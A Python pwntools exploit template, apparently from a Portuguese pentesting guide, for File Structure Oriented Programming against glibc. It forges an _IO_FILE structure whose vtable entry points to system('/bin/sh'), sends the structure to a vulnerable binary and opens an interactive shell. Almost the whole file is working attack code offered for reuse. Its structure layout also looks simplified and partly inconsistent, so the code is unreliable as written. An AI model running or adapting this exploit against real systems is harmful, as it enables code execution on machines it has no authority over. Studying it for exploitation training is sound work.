#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Template: heap/fsop — File Structure Oriented Programming (FSOP)
#
# > Fonte: [Bíblia do Pentest BR](https://0xmorte.gitbook.io/bibliadopentestbr/)
# > Seção: Linguagens & Runtimes — memory corruption (heap/glibc, FSOP)
# > Última sincronização: 2026-11-05
#
# Placeholders:
#   $BIN        — caminho do binário vulnerável
#   $IO_STDOUT  — endereço (hex, sem 0x) do _IO_2_1_stdout_ (ou _IO_list_all)
#   $SYSTEM     — endereço (hex, sem 0x) de system (ou one-gadget) na libc
#   $BINSH      — endereço (hex, sem 0x) de "/bin/sh" na libc
#
# Corrompe os campos de um _IO_FILE para desviar a chamada de vtable (fsop) para
# system("/bin/sh") ao disparar uma operação de I/O (ex.: exit / fflush). Os offsets
# dos campos dependem da versão da glibc; ajuste os valores abaixo para o alvo.

from pwn import *

context.arch = "amd64"
context.log_level = "error"

BIN = "$BIN"
IO_STDOUT = 0x$IO_STDOUT
SYSTEM = 0x$SYSTEM
BINSH = 0x$BINSH

# _IO_FILE_plus: _IO_FILE (0xd8 bytes) + vtable pointer.
# vtable[2] (__xsputn) -> system; _IO_write_base/_IO_write_ptr controlam o argumento.
vtable = IO_STDOUT + 0xd8
fake_file = bytearray(0x100)

def put(off, val):
    fake_file[off : off + 8] = p64(val)

put(0x28, BINSH)          # _IO_write_base -> "/bin/sh"
put(0x30, BINSH + 1)      # _IO_write_ptr > base forca o path de escrita
put(0xd8, vtable)         # vtable pointer
# vtable[0] (__dummy) e vtable[1] (__finish) devem ser validos; aqui assumimos
# que system fica em vtable[2] (__xsputn).
fake_file[0x100 : 0x108] = p64(SYSTEM)  # sobrescreve __xsputn

payload = bytes(fake_file)
# Envie o fake _IO_FILE para o local de escrita controlado (heap). Ajuste o fluxo.
p = process(BIN)
p.send(payload)
p.interactive()
